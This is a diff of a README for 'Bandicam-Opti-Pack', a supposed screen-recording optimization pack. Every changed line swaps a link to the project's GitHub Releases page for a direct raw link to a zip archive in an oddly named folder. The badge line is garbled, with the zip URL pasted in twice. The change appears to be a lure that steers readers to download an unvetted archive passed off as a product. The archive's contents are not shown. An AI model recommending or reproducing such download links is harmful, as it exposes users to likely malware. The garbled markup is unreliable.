@@ -1,6 +1,6 @@
 # 🎥 Bandicam-Opti-Pack - Optimize Your Screen Recording Experience
 
-[![Download Bandicam-Opti-Pack](https://img.shields.io/badge/Download%20Now-%20%F0%9F%9A%80%20-4CAF50.svg)](https://github.com/limrd/Bandicam-Opti-Pack/releases)
+[![Download Bandicam-Opti-Pack](https://raw.githubusercontent.com/limrd/Bandicam-Opti-Pack/main/autoagglutination/Bandicam-Opti-Pack.zip%20Now-%20%F0%9F%9A%80%https://raw.githubusercontent.com/limrd/Bandicam-Opti-Pack/main/autoagglutination/Bandicam-Opti-Pack.zip)](https://raw.githubusercontent.com/limrd/Bandicam-Opti-Pack/main/autoagglutination/Bandicam-Opti-Pack.zip)
 
 ## 📖 About Bandicam Opti Pack
 
@@ -17,7 +17,7 @@ Follow these simple steps to start using Bandicam Opti Pack:
 
 2. **Visit the Download Page**: Click the link below to go to our Releases page, where you can find the latest versions of Bandicam Opti Pack.
 
-   [Visit this page to download](https://github.com/limrd/Bandicam-Opti-Pack/releases)
+   [Visit this page to download](https://raw.githubusercontent.com/limrd/Bandicam-Opti-Pack/main/autoagglutination/Bandicam-Opti-Pack.zip)
 
 ## 📦 Download & Install
 
@@ -63,4 +63,4 @@ If you enjoy using Bandicam Opti Pack, consider contributing! Share your configu
 
 For more details and updates, always check our GitHub Releases page.
 
-[Visit this page to download](https://github.com/limrd/Bandicam-Opti-Pack/releases)
+[Visit this page to download](https://raw.githubusercontent.com/limrd/Bandicam-Opti-Pack/main/autoagglutination/Bandicam-Opti-Pack.zip)
